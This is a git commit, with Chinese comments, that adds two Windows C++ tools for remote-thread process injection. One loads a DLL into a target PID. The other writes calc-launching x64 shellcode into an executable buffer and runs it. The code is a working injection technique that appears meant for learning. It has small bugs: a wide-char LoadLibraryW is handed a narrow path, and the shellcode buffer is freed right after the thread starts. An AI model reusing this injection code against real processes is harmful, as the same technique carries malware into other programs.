7305b4d98718a3fdf49896314a69e4091bc3e6b5
平芜尽处外 <3256115215@qq.com>
2025-07-15 23:31:00 +0800

    远线程注入

---
+++ RemoteThreadInjector/RemoteThreadInjector.cpp
@@ -0,0 +1,126 @@
+﻿#include <iostream>
+#include<windows.h>
+#include <string>
+#include <tchar.h>
+#include <cstdlib>
+
+//注入代码
+bool InjectDLL(DWORD proccessID,const char* dllPath) {
+    HANDLE hProcess = nullptr;      // 目标进程句柄
+    HANDLE hThread = nullptr;       // 远程线程句柄
+    LPVOID pRemoteMem = nullptr;    // 目标进程内存指针
+    bool success = false;           // 操作结果
+
+    //打开目标进程
+    // 需要以下权限：
+    // PROCESS_CREATE_THREAD - 创建远程线程
+    // PROCESS_VM_OPERATION - 操作进程内存
+    // PROCESS_VM_WRITE - 写入进程内存
+    // PROCESS_QUERY_INFORMATION - 查询进程信息
+    //PROCESS_ALL_ACCESS    完整访问权限
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,proccessID);
+    if (hProcess == nullptr) {
+        std::cerr << "[!] Open Process failed：" << GetLastError() << std::endl;
+        return FALSE;
+    }
+
+    //在目标进程中分配内存
+    pRemoteMem = VirtualAllocEx(
+        hProcess,                   //目标进程的句柄
+        NULL,                     // 让系统决定分配地址
+        strlen(dllPath)+1,            //内存大小（包括null终止符）
+        MEM_COMMIT | MEM_RESERVE,   // 提交并保留内存
+        PAGE_READWRITE              // 内存可读可写
+        );
+    if (pRemoteMem == nullptr) {
+        std::cerr << "[!] VirtualAllocEx failed：" << GetLastError() << std::endl;
+        return FALSE;
+    }
+    
+    //将DLL路径写入到目标进程内存
+    if (!WriteProcessMemory(
+        hProcess,                  // 目标进程句柄
+        pRemoteMem,                // 目标内存地址
+        dllPath,           // 要写入的数据（dll路径）
+        strlen(dllPath)+1,        // 数据大小（包括null终止符）
+        nullptr                    // 返回写入字节数（不需要）
+    ))
+    {
+        std::cerr << "[!] WriteProcessMemory failed: " << GetLastError() << std::endl;
+        return FALSE;
+    }
+
+
+    //获取LoadLibraryA的函数地址
+    LPVOID pLoadLibrary = reinterpret_cast<LPVOID>(
+        GetProcAddress(
+            GetModuleHandle(L"kernel32.dll"),
+            "LoadLibraryW"
+        )
+        );
+    if (pLoadLibrary == nullptr)
+    {
+        std::cerr << "[!] GetProcAddress failed: " << GetLastError() << std::endl;
+        return  FALSE;
+    }
+
+    //创建远程线程执行LoadLibraryA，参数是我们写入的DLL路径
+    hThread = CreateRemoteThread(
+        hProcess,                  // 目标进程句柄
+        nullptr,                   // 默认安全属性
+        0,                         // 默认堆栈大小
+        (LPTHREAD_START_ROUTINE)pLoadLibrary, // 线程函数地址
+        pRemoteMem,                // 线程参数（DLL路径）
+        0,                         // 创建标志（立即运行）
+        nullptr                    // 线程ID（不需要）
+    );
+    
+
+    if (hThread == nullptr)
+    {
+        std::cerr << "[!] CreateRemoteThread failed: " << GetLastError() << std::endl;
+        return  FALSE;
+    }
+    // 这里等待INFINITE时间，确保DLL加载完成
+    WaitForSingleObject(hThread, INFINITE);
+
+    //检查线程退出码，确保LoadLibrary成功
+    //线程退出码就是线程函数（这里是 LoadLibrary）的返回值，LoadLibrary返回值为0表示DLL加载失败
+    DWORD exitCode = 0;
+    if (!GetExitCodeThread(hThread, &exitCode))
+    {
+        std::cerr << "[!] GetExitCodeThread failed: " << GetLastError() << std::endl;
+        return  FALSE;
+    }
+    if (exitCode == 0)
+    {
+        std::cerr << "[!] LoadLibrary failed in remote process: " << GetLastError()<< std::endl;
+        return  FALSE;
+    }
+    return TRUE;
+
+}
+
+
+int main(int argc,char* argv[])
+{
+    if (argc != 2) {
+        std::cout << "Uasge:"<<argv[0]<<" <PID>" << std::endl;
+        return 1;
+    }
+    DWORD TargetPID = static_cast<DWORD>(std::stoul(argv[1]));
+
+
+    const char* DLLpath = "Dll3.dll";
+    bool result = InjectDLL(TargetPID,DLLpath);
+    
+    if (result) {
+        std::cout << "DLLInject Success!" << std::endl;
+    }
+    else
+    {
+        std::cout << "DLLInject Failed!" << std::endl;
+    }
+    return 0;
+}
+
---
+++ RemoteThreadInjectorShellcode/RemoteThreadInjectorShellcode.cpp
@@ -0,0 +1,92 @@
+﻿#include <Windows.h>
+#include <iostream>
+#include <vector>
+#include <TlHelp32.h> 
+#include <string> 
+
+//弹出计算器的shellcode
+unsigned char buf[] =
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+
+bool injectShellcode(DWORD Target) {
+
+    //获取目标进程句柄
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,Target);
+    if (hProcess == nullptr) {
+        std::cerr << "[!] Open Process failed: "<<GetLastError() << std::endl;
+        return FALSE;
+      }
+    //在目标进程内创建内存空间
+    LPVOID remoteBuffer = VirtualAllocEx(hProcess,NULL,sizeof(buf), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (remoteBuffer == nullptr) {
+        std::cerr << "[!] VirtualAllocEx failed：" << GetLastError() << std::endl;
+        return FALSE;
+    }
+
+    //往内存内写入shellcode，写入失败返回0，成功返回非0
+    BOOL writeCodeResult = WriteProcessMemory(hProcess,remoteBuffer,buf,sizeof(buf),NULL);
+    if (!writeCodeResult) {
+        std::cerr << "[!] WriteProcessMemory failed:" << GetLastError() << std::endl;
+        return FALSE;
+    }
+    
+    //在目标进程内创建线程并执行shellcode
+    HANDLE hThread = CreateRemoteThread(hProcess,NULL,0, (LPTHREAD_START_ROUTINE)remoteBuffer,NULL,0,NULL);
+    if (hThread == NULL) {
+        std::cerr << "[!] CreateRemoteThread failed: " << GetLastError << std::endl;
+        return FALSE;
+    }
+
+    // 获取线程 ID
+    DWORD threadId = GetThreadId(hThread);
+    std::cout << "Thread ID" << threadId << std::endl;
+
+    // 等待远程线程执行完成 (可选，取决于Shellcode行为)
+    // 对于弹出消息框的Shellcode，通常不需要等待，因为它会阻塞目标进程。
+    // 对于其他Shellcode，可能需要等待其完成或超时。
+    // WaitForSingleObject(hRemoteThread, INFINITE); 
+
+    // 释放远程进程中分配的内存，虽然Shellcode执行后可能已不再需要，
+    // 但良好的实践是进行清理。
+    // 注意：如果Shellcode需要长时间运行或修改内存，则不应立即释放。
+    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
+}
+
+int main(int argc,char* argv[])
+{
+    if (argc != 2) {
+        std::cout << "Uasge: "<<argv[0]<<" <PID>" << std::endl;
+        return 1;
+    }
+    DWORD TargetPID = static_cast<DWORD>(std::stoul(argv[1]));
+    bool injectResult = injectShellcode(TargetPID);
+    if (injectResult) {
+        std::cout << "Inject Success!" << std::endl;
+    }
+    else {
+        std::cout << "Inject Failed!" << std::endl;
+    }
+    return 0;
+}
